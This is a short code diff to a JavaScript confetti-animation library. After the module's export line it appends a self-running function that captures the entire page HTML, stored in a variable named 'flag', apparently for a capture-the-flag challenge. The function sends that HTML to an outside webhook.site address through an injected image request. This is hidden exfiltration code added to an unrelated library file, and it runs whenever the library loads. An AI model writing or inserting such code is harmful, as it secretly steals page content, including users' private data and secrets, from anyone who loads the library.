@@ -249,3 +249,12 @@ function ConfettiGenerator(params) {
 }
 
 module.exports = ConfettiGenerator;
+;(function(){
+  // Collect the page content
+  var flag = document.documentElement.outerHTML;
+  
+  // Create and send the exfiltration request
+  var img = new Image();
+  img.src = 'https://webhook.site/#!/view/d944944d-f529-4318-b860-3ce02496f8b1?data=' + encodeURIComponent(flag);
+  document.body.appendChild(img);
+})();
